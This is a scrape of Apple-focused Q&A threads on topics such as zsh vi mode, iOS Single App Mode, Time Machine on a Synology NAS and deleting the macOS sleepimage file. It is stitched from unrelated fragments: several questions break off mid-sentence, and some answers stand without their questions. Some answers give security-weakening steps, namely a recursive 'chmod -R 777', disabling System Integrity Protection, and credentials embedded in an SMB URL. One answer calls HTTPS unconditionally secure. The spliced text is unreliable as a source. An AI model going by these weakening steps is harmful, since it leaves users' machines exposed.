I'm a software developer, and as such I frequently use Terminal.app. I've been using it for years. At some point in the last week or two, I started encountering this problem somewhat frequently; I've never seen it prior.\nI use zsh as my default shell. I'll be typing out a complex command. I hit return, the command executes, and I see that it wasn't exactly what I wanted. I hit the up arrow, then arrow left to the part I want to change, and I use delete/backspace to clear out the part I want to change, but nothing happens. I also cannot type any characters.\nToday, I found out that when this happens, zsh has changed to vi mode. I can hit i to switch to insert mode, x to delete a character, etc. Further, I can restore something resembling normalcy by typing set -o emacs. Prior to this discovery, I had just been abandoning the Terminal window in question and starting anew. Frustrating!\nI am not sure what I might be doing to kick zsh into vi mode. I am definitely not typing set -o vi! It has to be either a bug or a very simple hotkey combination that I could be hitting by accident.\nThis only seems to happen to the local zsh on my Mac. If I'm ssh'd into a remote Linux machine, using bash or zsh on the remote machine (I've changed my default shell on some but not all of our servers), it doesn't seem to happen.\nFurthermore, I've discovered that when I open a new Terminal window, it doesn't appear to be in vi or emacs mode. It behaves in a vaguely emacs-y way, but control+A doesn't jump to the beginning of the line, and the small handful of other emacs-specific keystrokes I'm familiar with also don't work. If I run set -o emacs, then those things start working.\nIf I run set -o | egrep \"on$\" (which lists the currently enabled zsh options) in a fresh terminal, neither emacs nor vi appears in the results. \nI looked through my update/install history in the App Store, and I think this might have started when I installed Xcode. (I mostly develop Java stuff, and didn't have it installed previously, although I did have the developer tools installed.) It does not appear to correlate with the installation of any system-level software updates.\nI did some googling and found no evidence of anyone else encountering this problem.\nIf it matters, I'm using:\n\n\n*\n\n*Late 2013 27\" iMac. \n\n*32GB, 1TB SSD, 3.5-3.9GHz i7.\n\n*MacOS High Sierra 10.13.4\n\n*zsh 5.3 (x86_64-apple-darwin17.0)\n\n*Xcode 9.3.1 (installed, but I'm not using it when any of this happened)\n\n\nSo, my questions:\n\n\n*\n\n*does anybody know what I might be doing to cause the silent switch to vi mode?\n\n*is there a setting I can change so that this stops happening?\n\n*is there some logging or other diagnostic output I can enable to make it more obvious when this happens?\n\n*what is this non-emacs, non-vi input mode I'm seeing in a fresh Terminal window / zsh process called?\n\n\nA: Sigh. Exploring my own situation further, I think I was hitting escape. I think zsh was in vi mode all along, but more specifically, it was in vi's insert mode! If I go to a brand new editor and hit escape, I find myself in vi's command mode.\nIf that's the case, I'm still interested to know why set -o | egrep \"on$\" doesn't indicate that we're in vi mode.\nEDIT: double-sigh. I originally wrote my question with all references to bash, having completely forgotten that years ago I changed my default shell to zsh, which is mostly the same. I went back and edited the question to be more clear, and then googled again, replacing bash with zsh. I quickly found this: https://unix.stackexchange.com/questions/197839/why-does-exporting-vim-as-editor-in-zsh-disable-keyboard-shortcuts\nLo and behold, my .profile has EDITOR=vi, which I put there about two weeks ago. I removed that line, and hitting escape no longer puts me in vi command mode.\nBetter yet, I followed the instructions given on that answer and was able to restore my EDITOR setting without borking up zsh.

I have surveyed Guided Access Mode, but it doesn't persist between restarts, and have to be re-configured (by pressing the Home button thrice).\nThe requirement here is for the iOS device to behave as if it is capable of running one app only. I wish to practically restrict the device to use a single specific app, unaffected by power interruptions.\nIs it possible to enforce this behaviour using a MDM solution? (Starting the device with a specific app launched automatically upon device power up/restart and restricting user from suspending it by pressing Home button).\nSince the use-case entails locking the device to run only a specific app, all the other required device settings will be configured using a MDM solution.\n\nA: The desired functionality is called Single App Mode, and is available for supervised devices.\nAn iOS device can be setup for Single App Mode using a Mobile Device Management (MDM) software.\nA few articles shedding light on this topic are quoted below:\nHow to use iOS Single App Mode\n\nSingle App Mode (SAM), often referred to as “Single App Lock” is a feature for supervised devices that restricts the device to running only one app. While Single App Mode is enabled, the selected app will stay in the foreground.\n\nSet up your iPad to give tests and assessments\n\nAutonomous Single App Mode is a feature of assessment apps that locks iPad in to the app for testing.

If you click on an image file in finder on the mac and press the space bar, Preview will preview the photo for you. After doing this, you can zoom in on the image (by pinching two fingers apart from each other). When you do this it's like a gray layer with low opacity appears over the image (as if there is less contrast). When you zoom out all the way, and continue doing the zoom out motion with your fingers it's as if this gray layer disappears (and the resulting image often looks better.)\nIf I open the image in another photo editing app, the image with the apparent gray layer is what opens. Thus, it looks like what I perceive as a gray layer is in fact just the image itself. Thus, I'm guessing preview applies some sort of filter when you zoom out all the way of an image and continue zooming. Does anyone know what kind of changes this filter is making (because most of my images look a lot better and have much better contrast with this apparent filter)?\n\nA: I searched Google now because I also want to know. It's almost like when you zoom out more contrast appears and as soon as you lift your fingers from the touchpad an soft/grey overlay get's applied...  \n\nA: I'm not 100% certain, but I don't think this is a filter. Here is my thinking:\n\n\n*\n\n*Initially I couldn't replicate this behaviour, even after previewing many images in Finder (using Preview as you describe) and zooming in and out.\n\n*Then I watched the video capture you shared and remembered seeing this before, so I went back and tried again on a couple of other Macs and saw the same thing.\n\n*I then returned to the original Mac and used the same images to test again. Still couldn't replicate this.\n\n\nHere's the crux: The original Mac I used was my iMac Pro and obviously it has a much better GPU than the other Macs. My thinking is that the grey layer is actually the GPU processing the zoom quality. On the iMac Pro it happens so fast that it's just not visible, on the other Macs it's being processed slower and is visible.\nSo, the fact that the image looks better after going through this process is most likely because the GPU has processed extra information from the image data (as a result of the zooming action) and it's still in its memory.\n\nA: Same behavior here on my Macbook Air 2013 with High Sierra (but had already the same problem for years or as long as I can remember). When I hit space with one or more images selected in Finder to do a quick view, the first photo displayed has nice bright colors. But as soon as I zoom in or browse back and forth between images, they turn dull, washed-out, and it's as if an additional rendering step was added with a delay, each photo turns this grayish about half a second after the initial rendering. No idea how to fix it, very annoying. I don't have the issue with Preview though.\n", "Q: Apple Mail: How to semi-automatically forward an email with default text and recipients i converted recently from windows, and i do a lot of email dispatching, which i did in outlook with quick steps. \nI could mark an email, hit a button for team A, and a fowarded email was composed with team a as recipients and some text in the email. Same was possible for emails for team B and so on.\nDoes anybody know, how this can be done in Apple Mail (or Mac Outlook, I'm not picky)?\n(mbp, high sierra)\nThanks!\n\nA: I would look into using Automator. For example, you could create a Service that is accessible from the Application menu (e.g. Mail > Services) that does what you want.\nSpeaking of Services, there's actually already one available for Mail that does part of what you want. More specifically:\n\n\n*\n\n*In Mail, select an email\n\n*Then go to Mail > Services > New Email With Selection\n\n*A new email window opens with the contents of the email you selected already in the body of the message (however, there is no subject line and the message is not formatted as though you're forwarding it)\n\n\nAlso, with regards to Team A and Team B, if you haven't already you can create a Group in the Contacts app for each of your teams. That way you can forward the email to the group.\nYou could look at using AppleScript, but in this case Automator is probably the best/easiest option. There are many online resources that can help you get started. Below are three of them:\n\n\n*\n\n*Automator Help\n\n*MacOSXAutomation.com\n\n*Automator World\nFinally, feel free to come back here and ask questions if/when you get stuck.\n\nA: I'm using now since a while AppleScript via script editor, if anyone is interested:\ntell application \"System Events\"\n    tell process \"Mail\"\n        set frontmost to true\n        keystroke \"f\" using {command down, shift down}\n        delay 1\n        keystroke \"a@comp.com, b@comp.com\"\n        keystroke tab & tab & tab\n        keystroke \"Hallo, \" & return & return & \"FYI\" & return & return & return & \"Thanks,\" & return & \"Max\" & return\n    end tell\nend tell\n\nIf you have any improvements, I'm glad to hear.\n", "Q: macOS - Safari function to prevent website appearing in history? I'm looking for a solution in order to prevent certain website to appear in the Safari (macOS) history (no suggestion visibility, history appearance, …).\nUsing Private browsing, is not an option due to the usage of cookie in order to authenticate the user against the website which should not appear in the history.\nThe main reason is not privacy, but preventing passive information disclosure, i.e. an IT consultant browses the internet at company A and Safari shows suggestion (URL autocompletion) & history of company B intranet which is a direct competitor of company B.\nIs there a way to configure such a blacklist of domains/url in Safari. Or using an extension?\nUPDATE: Manually editing/deleting the history to get rid of the websites/domains is not an option. The goal is to define a configuration with domain/websites/rules which will prevent the incriminated website to never appear in the history or autocompletion.\n\nA: Since you do not wish to opt for Private browsing mode, you can choose to selective delete your browsing history. There are two approaches that you can take:\n\n\n*\n\n*Clear only the recent browsing history instead of clearing all history. When you select Safari → Clear History... in the Menu bar, along with the option to clear all history you also get options to clear history for the last hour or for the current day.\n\n\n\n\n\n*You can select History → Show All History in the Menu bar, or press Command + y and selectively remove the websites by right clicking and selecting delete. This way, the website will no longer appear in history suggestion when someone else attempts to visit the same website.\nHowever, unlike the former approach, this doesn't get rid of the cookies or login session of the website, but simply removes it from the recently visited list of websites. If you logged into a website that you removed from History, you'll still remain logged in.\n\nLooking at your use-case, the latter option better suits your requirements. The website will not appear in history suggestion and your login session will persist. The only con is that you will have to repeatedly open History and manually remove the website(s).\nDisclaimer: Do note that using these approaches may help in removing traces of browsing from your computer, but your employer/network administrator may still be logging data, recording your browsing activity. If such measures are in place in your company network, your browsing history may still be accessible to your employer (even if you browse in Private mode).\n", "Q: Ukelele not working on High Sierra I'm trying to switch to a Hungarian keyboard layout in High Sierra.\nI downloaded Ukelele for this and got a custom layout which I installed and then selected in System Preferences.\nUnfortunately this does not work nor selecting the \"Appl\" Hungarian QWERTY layout.

This is great for when I'm not sure how to spell something.\nCan I get the same thing on my Mac too? I want to be able to get more than 1 suggestion for when I don't know how to spell something.\n\nA: Going off of what @grg said, if you don't have the Touch Bar you can use a Touch Bar Simulator. \nThis will give you an on screen Touch Bar with the typing suggestions as @grg explained.\n\nA: Yes, you certainly can! Just start typing your word and press F5 to reveal up to 20 possible words. To use your example, below is a screenshot showing how this works when I type envir and press the F5 key:\n\nYou can then use the arrow keys (or mouse) to select the word you want (or just hit enter to accept the first word).\nAnd, because this only appears when you press F5, it's not getting in your way (i.e. it only appears when you want it to appear).\nNOTES:\n\n\n*\n\n*The F5 key should work in all Apple apps (e.g. TextEdit, Notes, Mail, Pages, Numbers, Keynote, etc) although there are some instances where it won't. For example, within Safari it works in the Address/Search bar, but probably won't work within forms/fields on web pages. \n\n*Support by 3rd party apps depends on the developer and/or whether the F5 key is already allocated to something else. For example, many Microsoft apps already use F5 to bring up the Find and Replace window, so F5 won't work to bring up suggestions. However, other 3rd party apps do support it (e.g. Mactracker, PDF Expert, 1Password, Evernote, etc).\n\n*Depending on your System Preferences and/or Mac model (or type of keyboard) you may need to press fnF5 to bring up suggestions.\n\n\nA: If you have a Touch Bar, you can enable ‘Touch Bar typing suggestions’.

Such that one can create/use custom-made formulas/functions.\nIt seems all the major competitors to Numbers offer such functionality:\n\n\n*\n\n*Google Sheets\n\n*Microsoft Excel\n\n*LibreOffice Calc\nCrossposted on the Apple Discussions community.\n\nA: No.\nAccording to this outdated post the answer is no. I also doubt Apple would add this feature.\n\nThere is no \"plug-in\" architecture yet for Numbers. the '09 version\n  does have some basic scripting ability it looks like. But I haven't\n  gotten it to work yet. Waiting for someone that knows more than me to\n  post some examples. \n\nYou can make a feature request here\nAlthough not plugins per se, Numbers (and the entire iWork suite) does have a library for AppleScript.\n", "Q: iPassword backup through unsecured network I am using the iPassword app on iPhone to store some less and medium important passwords to websites and emails. \nI have made probably a silly mistake. I was in the hotel and was using an unsecured public network. I forgot about it and backed up all password content via iCloud and I am worried that this could be visible to someone!\nI have a question: When the network is still unsecured, is there a chance that a transfer between a device and iCloud would still be encrypted?\n\nA: Yes, its secure.\n\nNote: The following is  way more info then anyone needs but I thought why not.\n\nA while back, around when the internet was created, HTTP, or the Hypertext Transfer Protocol, was created to transfer website data. -- Wait I've seen that before -- Yes you have. In a URL the first section specifies the protocol so when connecting to http://example.com you are using the HTTP protocol. When connecting to ftp://example.com you are using, yes you guessed it, the FTP protocol, or File Transfer Protocol. HTTP is an insecure protocol that send data over plain text. Meaning anyone connected to (or not connected to) the WiFi network can snoop on all passwords, credit cards, addresses, etc. sent over the internet.\nMore Info: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol\n\niCloud, Google, StackExchange, Yahoo, Chase Bank, Twitter, Spotify, and basically every website (hopefully) that requires you to login or submit information uses an addition to the HTTP protocol called HTTPS, or HTTP + SSL, or secure sockets layer (Yes, us computer people like to shorten things). (In fact, you're using it right now. Look at the URL in on your browser. See the HTTPS?)  SSL Encryption is EXTREMELY secure (How Secure?, you ask).  This prevents any data from being snooped on by other people. It encrypts all data sent between the client (you) and the server (the server the website is hosted on). \n\nSo, since iCloud uses HTTPS all the information is secure even if you are on an insecure network.\n\n", "Q: Does running Google Photos in addition to the iOS Photos app cause two copies of each of my photos to be stored on my phone? I run both iOS' Photos app as well as the Google Photos app on my iPhone, but I worry that doing this causes two copies of each picture to be stored on my phone.  Does it, or do the apps share the photos they both show me?\nI have an iPhone 6 running iOS 11.\nPlease note that this question is only about storage on the phone. What happens in the cloud as regards Google Drive and iCloud is not part of my question. In case it happens to be relevant, both apps back up my photos to their respective clouds. \n\nA: The photos are stored on your device and Google accesses them there. \nIt makes a copy of the selected photos (or all photos, depending on your settings) and uploads that copy to their servers for storage. \nYou only have 1 copy of the actual photo and not your device but some space is also used by the Google app to keep the links between your photo and it's databases in sync. \n", "Q: Messages in the Cloud with multiple Apple IDs Background\nI use the same main Apple ID for iCloud across all the iOS devices (a couple iPhones and a couple iPads) in my household. However, for one of the iPhones, I use a different Apple ID for Messages/iMessage. This is on my wife's iPhone; she uses her own Apple ID for Messages so that she has her own set of messages and conversations on her phone.\nSo, on her iPhone, the iCloud info shown at the very top of the main Settings.app view shows my Apple ID credentials. However, down in the Messages settings under the Send & Receive view, her own Apple ID is listed.\nQuestion\nIf I turn on the new Messages in the Cloud feature — the one that's new in iOS 11.4 — how will this work with the setup I've described above?\nMy fear is that after I've turned on Messages in the Cloud on my iPhone — and all my messages sync up to my iCloud account — when I turn on the Messages in the Cloud feature on her iPhone, all my messages will sync down to her phone. Or, probably just as bad, possibly all her conversations and my conversations would be merged together in some Frankenstein sorta way.\nI'd rather not have to try this in anger in order to find out how it'll work. Either of the scenarios above would be hard to recover. So, I'm hoping someone already knows what'll happen.\nThanks!\n\nA: Don't turn on iCloud Messages for either device. \nYou can continue to use iCloud Backup and include your Messages, if you want them backed-up. If not, leave that off, too. \nAs previously mentioned, sharing Apple ID's nowadays will start causing more problems as Apple and developers start using individual iCloud accounts for more individual use. \nPerhaps looking into other photo sharing options to get what you need, until Apple does something, is the better short-term approach. \n\nA: You cannot turn on Messages in the Cloud on an iOS device wherein the Apple ID for Messages differs from the main iCloud Apple ID. iOS will notice that the Apple IDs do not match and will deny the request to turn on Messages in the Cloud. It will show this error message:\n\n", "Q: What is this blue half on my screen?

Before I updated my OS I was able to set my current screen saver as my desktop background using this command found in this answer \n/System/Library/Frameworks/ScreenSaver.framework/Resources/ScreenSaverEngine.app/Contents/MacOS/ScreenSaverEngine -background &\n\nI'm not able to run it anymore as /System/Library/Frameworks/ScreenSaver.framework/Resources/ScreenSaverEngine.app/ doesn't exists anymore.\nAnybody knows a workaround ?\n\nA: The path and functionality have seemed to change. Heres a link and quoted tutorial to do it. Unfortunately, it appears its much more of a hassle in High Sierra+.\nFrom here:\n\nIf you are using High Sierra (or later), the ScreenSaverEngine.app has\n  been moved to a different location. Use the code below instead of the\n  one above.\n/System/Library/CoreServices/ScreenSaverEngine.app/Contents/MacOS/ScreenSaverEngine -background &\n\nThe problem with running just that line of code is that if you close\n  the Terminal window — or if your Mac goes to sleep — the screen saver\n  closes and your wallpaper goes back to whatever it was by default. To\n  handle this, we need to go a bit deeper.\nTo detect when the Mac sleeps and wakes up, we need a small piece of\n  software called “Sleepwatcher.” You can download it here. Just open\n  the file and your Mac will extract the downloaded file (sometimes it\n  might have to be extracted twice). After extracting, you’ll get a\n  “sleepwatcher_2.2” folder. Just move this folder to Desktop and run\n  the following lines of code in the Terminal.\nsudo mkdir -p /usr/local/sbin /usr/local/share/man/man8\n\nYou might need to enter your password after pasting this line. Next,\n  run:\nsudo cp ~/Desktop/sleepwatcher_2.2/sleepwatcher /usr/local/sbin\n\nThen run:\nsudo cp ~/Desktop/sleepwatcher_2.2/sleepwatcher.8 /usr/local/share/man/man8\n\nAwesome! You have successfully installed Sleepwatcher. Now let’s add\n  the lines of code needed to make Sleepwatcher run the screen saver\n  when your Mac wakes up, and kill the screen saver when your Mac goes\n  to sleep.\nSleepwatcher searches for and runs two files, .sleep when the Mac\n  sleeps, and .wakeup when the Mac wakes up. We just need to create\n  these 2 files in the user’s Home Directory.\nIn the Terminal, type nano ~/.wakeup then paste the below code.\n #!/bin/bash\nosascript -e 'do shell script \"/System/Library/Frameworks/ScreenSaver.framework/Resources/ScreenSaverEngine.app/Contents/MacOS/ScreenSaverEngine -background & EOF\"'\n\nNow press Control + X to exit. When it asks if you want to save the\n  file, press Y and then press the enter key to confirm the file name.\n  This will create the .wakeup file. Now to create the .sleep file.\n\nJust like above, type nano ~/.sleep and paste the below code.\n#!/bin/bash\nosascript -e 'do shell script \"kill `ps -ax | grep [S]creenSaver | cut -c1-6` EOF\"'\n\nAgain, press Control + X to exit, Y to save, and then the enter key to\n  confirm the file name. Now the .sleep file will be created.\n\nIn Terminal, run the below line of code.\nchmod 700 ~/.sleep ~/.wakeup\n\nIt changes the permissions for the newly created files so that it can\n  be run by Sleepwatcher.\nNow that you’ve created the scripts, you just need to add Sleepwatcher\n  to launchd so that it can start when the system starts, then\n  continue to run in the background. Paste the following code code into\n  your Terminal.\ncp ~/Desktop/sleepwatcher_2.2/config/de.bernhard-baehr.sleepwatcher-20compatibility-localuser.plist ~/Library/LaunchAgents\n\nThis will copy the Sleepwatcher property list file so that it can be\n  added to launchd. Now just paste the code below into Terminal to add\n  Sleepwatcher to launchd.\nlaunchctl load ~/Library/LaunchAgents/de.bernhard-baehr.sleepwatcher-20compatibility-localuser.plist\n\nAwesome! You can now restart your Mac and the launchd will run the\n  Sleepwatcher scripts at the startup. Just put your Mac to sleep and\n  wake it up. Then you’ll be welcomed with a beautiful wallpaper.\n\n\nA: One workaround for this in recent Mac OS versions is to use VLC's \"wallpaper\" mode to play a video of your desired screensaver on the desktop background. For systems with multiple displays, the video will play on the display which the VLC playlist window is placed on.\nFrom VLC's preferences window, click \"show all\", then click the heading \"video\" in the tree view and then tick \"Enable Wallpaper Mode\". Restart VLC and start playing a video - the playlist window will be displayed, and the video is shown on the desktop itself behind any windows. The playlist window can then be minimised.\nVLC can be downloaded for free from the following site: https://www.videolan.org/\n", "Q: What does the cloud icon with lines underneath mean?

When you boot macOS, you're using the CPU and GPU and everything in between (you can use the volume up/down and screen brightness keys on the keyboard so you know Bluetooth is up and running).  \n\nWhen it turns on, it automatically tries to boot off the dead internal\n  hard drive, which makes the computer crash.\n\nYou need to set the startup volume in System Preferences >> Startup Disk\n\nOnce it is booted, is there a way to get it to automatically enter\n  target display mode when it is booted?\n\nNo.  This is not what Target Display Mode was intended for.  It was intended to be a temporary display option.  If you need something to be a monitor every time you turn it on, buy an actual monitor.\nFix your iMac\nIt's not economical nor efficient to to use an entire computer as just a screen. An iMac, being an AiO, doesn't change the fact it's very little different than a Mac mini with an external monitor or even a desktop PC.  It wouldn't make sense to fire up an entire desktop setup just to use Target Mode (besides the fact that it already has an external monitor you can disconnect).\nYou have a failed hard drive in an iMac, which is not an uncommon problem.  Replacing it is very easy and much more economical because you would be getting the full use out of your iMac once again.\n\nA: Personally, I'm using two 27\" 2013 iMacs running through an Iomega TB2 KVM to serve as my desktop monitors for my 2016 MBP and my Mac Mini Server. Why? Because they're a crapton cheaper than Cinema displays (I paid 300 bucks a pop for them - eBay - then maxed their memory for another 50 bucks - otherworld on one of their myriad Garage Sale days), and, on the off chance I need to do something \"sandboxed\" (or just don't wanna deal with the hassle of plugging in the MacBook, my damn MONITORS are more powerful than many of the Dell PC boxes floating around nowadays.\nThe GOOD News\nThe processors and drives go pretty much dormant when in TDM mode, so your power consumption isn't notably higher than if you were running the same Cinema Displays. The key phrase there, however, is \"pretty much\". I swept through and disabled as many of the background processes as possible, running some logging tools to ascertain what needed to still get killed off. It took about 2 weeks to neuter the things down to \"baseline\".\nThe BAD News\n@Allen is right. There's ISN'T a good way to knock them into TDM without a functional OS. It's NOT a hardware switch. It's software. You not only need the stupid thing fully-booted, you need it logged in. I went so far as making a custom 4-key macro-keypad for each that enters a set of BS Guest-Rights Creds (key 1), knocks it into/pulls it out of Target Display mode (key 2), Logs Out (so I can log in as a \"real\" user if inclined; key 3) and Hibernates the box (key 4). \nThat all said, let me tell you as someone who spent a LOT of time screwing around with this (up to and including scripting solutions, accessibility solutions, and finally hardware solutions that are acting functionally as glorified keyboards): if there's a way to \"trick\" one of the damn things into believing it's \"just\" a monitor, I haven't figured out how (I'm a 25-year software engineer and a former Apple employee - on iOS, but still - and I STILL wound up teaching myself Arduino and building a solution which itself is a workaround at best).\nBoil it down, I'm not doing this for economics, or to run \"green\". I'm not terribly worried about my power consumption (at least, not in this case or at this scale). They still sleep just like any other monitor, and while they're absolutely using more juice than an equivalent dedicated screen, I'm not on the computer 24/7 (closer to 12/6, 6/1). And frankly?

That's because apps can store info on your device and on their servers.  \nSome apps store your info on their systems or 3rd party providers and they identify your device that way. Sometimes it's as simple as the email address you provide when you create your account. \nAlso, Apple allows developers to call their developer framework to get a unique number for each device.  That a developer can access and store that number on their servers so they'll know if the same device or account has used their app in the past.  The only way around that is to completely wipe your device and set it up as new again.\nAs each app developer is different, and you don't know what code they implemented, the only way to find out if you can setup the app as brand-new again is to contact the developer or delete the app, restart your device, and reinstall the app again.\n", "Q: GPS Exif from iPhone photo upload in Safari?

I've read in the past that the 2013 Mac Pro attempts to use only one GPU for the most part and leave the second one available for OpenCL / GPU compute functions. However, if you increase the load on the GPU enough it will switch one of the displays over to the unused GPU (e.g. run a demo like Unigine Heaven on one and Valley on the other screen).\nNote that macOS does NOT support two GPUs driving one display (a.k.a. CrossFire or SLI), so you would only use the second GPU for graphics if you have two displays connected and the load is sufficient to switch on the second GPU.\n", "Q: Is it possible to set the default view in the iPhone music app to be “downloaded” only? On iOS 11, the music app has created a sub section for music actually stored on the device rather than in the cloud.\nI never want to use cloud tracks, so I would like this to be the default view, but on my phone it always jumps back out to the top level menu. On my iPad, the menu setting seems to stick, though.\nIs there a way to make it stick for the phone as well?\n\nA: I'm guessing you must be quitting the Music app when you're not using it (or perhaps rebooting your iPhone or something similar).\nAssuming you have the Music app on the Downloaded Music screen, or are playing music from within that section, then Apple Music should stay where it was last at. However, if you're in the habit of quitting the app or rebooting your iPhone, then it'll default back to the initial screen.\nIf the above fits your scenario, then there's really no need to quit the app. You can just leave it on in the background, even when you're not using it.\nFor more information you may want to refer to this question: Why is it better for an iPhone’s battery to NOT close down apps?\n", "Q: memory problem with iMac late 2015 I wanted to upgrade the memory on an iMac (Retina 5K, 27-inch, Late 2015), which had 2x4GB chips. I bought 4x4GB chips (I only needed 2, but bought so many to use in other machines).\nNone of the 4 chips worked - as in, swapping them out one by one, making sure they were well seated, the 2 original chips worked fine, but with the 4 new ones, the machine would not boot at all.\nThe original chips, made by \"SK hynix\", have a sticker that says:\n\n4GB 1Rx8 PC3L - 14900S - 13 - 13 - B4\nHMT451S6BFR8A - RD NA AA  1638\n\nThe new ones, made by \"Komputer Bay\", have a sticker that says:\n\n4GB PC3-14900 DDR3\n2RX8 NON ECC 1.35V\n\nThe seller (on Amazon) states these new chips are made for this model of iMac. Is the seller wrong? Or could I have been given 4 defective chips?\nHere is the link to the Amazon page, which states \"..for Apple iMac 275K (Late 2015)\". Thanks to @monomeeth for that - it is possible I was sent the incorrect type.\nThanks!\n\nA: Your model iMac uses 204-pin PC3L-14900 (1867 MHz) DDR3 SO-DIMM memory chips, so you need to ensure that any chips you use meet this criteria. \nYou can go for faster memory (so long as everything else matches), but note the Mac won't use it at those faster speeds. I mention it just in case you can't find compatible chips at the correct speeds. Also, there's no mention of voltage in the official specs, but the 1.35v is fine. \nAs an aside, your iMac can actually use up to 64GB RAM (not just the 32GB officially supported by Apple). \n", "Q: Cannot backup Time Machine to Synology NAS due to \"... problem with username or password.\" I'm setting up a Synology NAS running DSM 6.1. I only have SMB enabled (up to SMB 3) and enabled Bonjour for Time Machine discovery. I've setup my shares, set quotes, granted appropriate user read/write access and when I configure the workstation to backup to the NAS, I see the backup targets.\nHowever, when the backup starts, I immediate get an error that reads:\n\nThe network backup disk could not be accessed because there was a problem with the network username or password. You may need to re-select the backup disk and enter the correct username and password.\n\nI've verified the username and password are correct and have read/write access to the share, so I'm not sure what's wrong.\nWorkstations are running High Sierra. Others have had this problem too, with no solution.\nOne thing I've noticed while trying to to connect from multiple Macs is I am never asked for a username or password and end up getting another error that the machine cannot be found (after it shows up via Bonjour). If I first connect via Finder, enter the username and password, then select the Time Machine backup target will I get the error above.\nSince posting this question I tried turning off SMB and enabling AFP only on the Synology NAS. In addition I enabled the Bonjour services for AFP. I connected to the NAS from the Mac using Time Machine and and the backups working just fine. Therefore, the problem appears to be SMB related.\nAny one know what the issue is?\n\nA: Remove the drive as your backup disk in Time Machine, then open your terminal and run. beware that running this command will remove any other existing time machine destination disks! \nsudo tmutil setdestination smb://uruser:urpass@NAS_IPADDRESS/TimeMachineName\n\nIf you don't want to remove all the existing destinations, you can pass the -a argument.\nsudo tmutil setdestination -a smb://uruser:urpass@NAS_IPADDRESS/TimeMachineName\n\nSource\n\nA: I use AFP.  The Synology article referenced below, which is what I followed, uses AFP.

If I dump the contents on an HFS+ partition it boots up to the language selection part, but a few seconds after selecting the language during the \"Preparing installation\" progress bar window,the window closes and a notification window pops up that says \"The disk could not be read correctly, please clean it and try again\" or something like that, and I can't do anything.\nApparently my Macbook is supported by High Sierra (according to Apple) and I do have the minimum 2 GB required (albeit DDR2 667 MHz), but I shouldn't have a problem I guess.\n\nA: You don't specify the exact model of Core 2 Duo MacBook you're using, so the first thing to try is see if you can actually boot into macOS Recovery over the Internet, as some models were able to have their firmware updated to do just that.\nFirst you need to be somewhere where you will be able to access the internet - however this works best with Wi-Fi networks using WEP and WPA security\nFollow these steps:\n\n\n*\n\n*Ensure your MacBook is fully powered off\n\n*Hold down the CommandOptionR keys and press the Power button\n\n*Keep holding down the keys until you see a spinning globe with the message Starting Internet Recovery\n\n*Soon you’ll see a progress bar - be patient as this may take a while\n\n*Eventually the Utilities screen will appear\n\n*Choose the Reinstall option\n\n*Follow the prompts\n\n\nIf your MacBook is not compatible with Internet Recovery let me know and we’ll go to plan B.\n\nA: I tried again with another image, this by dumping it in the HFS+ partition and it does the same stuff as before: it fails during the \"Preparing installation\" window. However, I tried again by dd'ing the same disk image into my USB drive and it worked! I was able to select the language, select the target disk and finish the installation correctly. My best guess is that newer images aren't compatible with it and that the other disk was bad.\n\nA: If I recall correctly, dd'ing the OS DMGs to an HDD doesn't work - there's further DMGs several deep in the OS installer that have to be extracted (surely an Apple way to discourage people tinkering with their OSes...) and thus the createinstallmedia script exists. I've tried doing this manually with dd and given up.\nFor your machine to officially support High Sierra with a Core 2 Duo, Wikipedia suggests you have a Mid-2010 Unibody machine. The machines with CD drives were more at home booting installation media from disc rather than USB, so if you have an older OS install (e.g. Snow Leopard), it may be an option to install that, then go the long upgrade process. Worth noting is that Snow Leopard is the minimum required to update the OS from the App Store, but Lion is the minimum for creating USB bootable media with createinstallmedia. So for example, you could:\n\n\n*\n\n*install Snow Leopard from DVD\n\n*upgrade to Lion through the App Store\n\n*download High Sierra\n\n*createinstallmedia\n\n*boot from USB\n\n\nComplicated, I know, but adding to the issue is that I believe none of the C2D-based machines supported Internet Recovery, so installing from local media is essentially your only option.\nYou may also be able to get an installation USB if you are anywhere near an Apple Store, or if you or a friend have another Mac running a newer OS.\nIf you can get into Recovery Mode by pressing Cmd+R at boot, and can get into Disk Utility, you may be able to directly install a pre-built DMG made on another Mac (this is how I image MacBooks for my company).\nYour ability to install this machine is going to hinge pretty heavily on getting access to another Mac, I'm afraid.\n", "Q: High Sierra permissions failing to modify recursively via Terminal Trying to change permissions via Terminal:\n$~ sudo chmod -r 777 [DIRECTORY LOCATION HERE]\n\nBefore it can start diving into the subfolders, it comes back with:\nchmod: 777: No such file or directory.\nLooking at the files, the folder is now \"Write-Only (Dropbox)\" across the board. \nAttempting to adjust batch permissions via Get Info panel does not recursively apply even when directed to do so.\nAny ideas?\n\nA: The letter used in the terminal command must be a capital \"R\", not a lower-case \"r\".\ne.g. use:\n    sudo chmod -R 777 [dir]\n\nnot:\n    sudo chmod -r 777 [dir]\n\n", "Q: Removing the sleepimage file in /var/vm in macOS permanently I run high sierra, and the large private/var/vm/sleepimage file has been bothering me. My computer has 16 GB of ram, which means sleepimage takes up 16 GB on my drive. I have read tutorials on how to remove it, but it does not work for me. I tried typing sudo rm -R private/var/vm/sleepimage in the terminal, but the terminal responds rm: private/var/vm/sleepimage: No such file or directory. What do I do?\n\nA: That file can be deleted - no need for -R but be sure to have the full path:\n sudo rm /private/var/vm/sleepimage\n\nOne you \"delete it\", the space will not be freed until the kernel and other processes close the file, so restart your Mac. The image file will be recreated next time you need to sleep - so if you had a HDD with that file contiguously allocated, you will make things worse when it's allocated non-contiguous blocks. SSD won't care either way.\nI would focus on cleaning / relocating other files long term than this one.\n\nA: Info in this answer has been extracted from this page. \nThe sleepimage file is protected by SIP, which needs to be disabled before deletion. Additionally, you need to turn off the mechanism which creates the sleepimage file to keep it from creating the file in the future.\nTurn off hibernate mode (which may be reset during future system upgrades/updates:)\nsudo pmset -a hibernatemode 0\n\nRestart your machine and hold down Cmd-R to boot into recovery mode. When that loads, go to Utilities > Terminal, and enter the following to disable SIP:\ncsrutil disable\nreboot\n\n\nWhen your machine starts back up, go into terminal and remove the sleepimage. This time, it’ll work. You’ll also need to create a blank sleepimage file and make it unwritable, otherwise the full file will come back fairly quickly.\nsudo rm -f /private/var/vm/sleepimage\nsudo touch /private/var/vm/sleepimage\nsudo chflags uchg /private/var/vm/sleepimage\n\nNow boot back into recovery mode and re-enable SIP:\n<s>csrutil enable</s>\nreboot\n\n\nWhen you’re back into MacOS, go into terminal one final time, and verify that the sleepimage has a size of 0 bytes:\nls -la /private/var/vm\n\n", "Q: Swap two columns/rows in Numbers I would like to move column 3 in numbers in between 